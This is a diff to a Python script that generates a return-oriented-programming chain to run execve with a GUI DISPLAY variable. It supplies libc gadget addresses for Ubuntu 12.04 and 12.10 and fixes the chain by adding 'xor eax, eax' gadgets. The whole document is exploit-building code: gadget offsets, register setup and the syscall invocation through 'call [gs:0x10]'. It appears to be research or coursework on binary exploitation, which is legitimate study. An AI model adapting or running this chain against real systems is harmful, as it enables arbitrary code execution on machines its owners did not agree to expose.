@@ -38,9 +38,9 @@ def gui_execve(path):
 
     rop_code = xor_eax_eax + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x10: Offset for NULL after DISPLAY=:0.0 (.data base)\\n'
     rop_code = rop_code + mov_edx_eax
-    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x18: Offset for envp\\n'
+    rop_code = rop_code + xor_eax_eax + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x18: Offset for envp\\n'
     rop_code = rop_code + mov_edx_eax
-    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : '
+    rop_code = rop_code + xor_eax_eax + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : '
 
     if len(sys.argv[1]) % 4 == 0:
         null_offset = offset + 4
@@ -51,7 +51,7 @@ def gui_execve(path):
     rop_code = rop_code + mov_edx_eax
     rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x14: Offset for DISPLAY=:0.0 (.data base)\\n'
     rop_code = rop_code + pop_ecx_pop_ebx + 'Address    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n' + 'Address    : 0x1c: Offset for ' + tokens[0] + ' (.data base)\\n'
-    rop_code = rop_code + add_eax_b
+    rop_code = rop_code + xor_eax_eax + add_eax_b
     rop_code = rop_code + call_gs_10
 
     for token in reversed(tokens):
@@ -102,15 +102,25 @@ def main():
     global add_eax_b
     global call_gs_10
 
-    if len(sys.argv) == 4 and sys.argv[3] == 'kavya':
+    if len(sys.argv) == 4 and sys.argv[3] == 'ubuntu12.04-libc2.15':
         pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
         mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
         xor_eax_eax = 'ROP command: 0x341a5L: xor eax eax ;;\\n'
         pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
-        mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
+        mov_edx_eax = 'ROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;\\n'
         pop_ecx_pop_ebx = 'ROP command: 0xfca82L: pop ecx ; pop ebx ;;\\n'
         add_eax_b = 'ROP command: 0x148428L: add eax 0xb ;;\\n'
         call_gs_10 = 'ROP command: 0xb8dc5L: call dword [gs:0x10]'
+
+    elif len(sys.argv) == 4 and sys.argv[3] == 'ubuntu12.10-libc2.15':
+        pop_ecx_pop_eax = 'ROP command: 0xf2c81L: pop ecx ; pop eax ;;\\n'
+        mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
+        xor_eax_eax = 'ROP command: 0x32eb0L: xor eax eax ;;\\n'
+        pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
+        mov_edx_eax = 'ROP command: 0x85f14L: mov [edx] eax ; mov eax edx ;;\\n'
+        pop_ecx_pop_ebx = 'ROP command: 0xfc9e2L: pop ecx ; pop ebx ;;\\n'
+        add_eax_b = 'ROP command: 0x148366L: add eax 0xb ;;\\n'
+        call_gs_10 = 'ROP command: 0xb8d05L: call dword [gs:0x10] ;;'
 
     else:
         pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
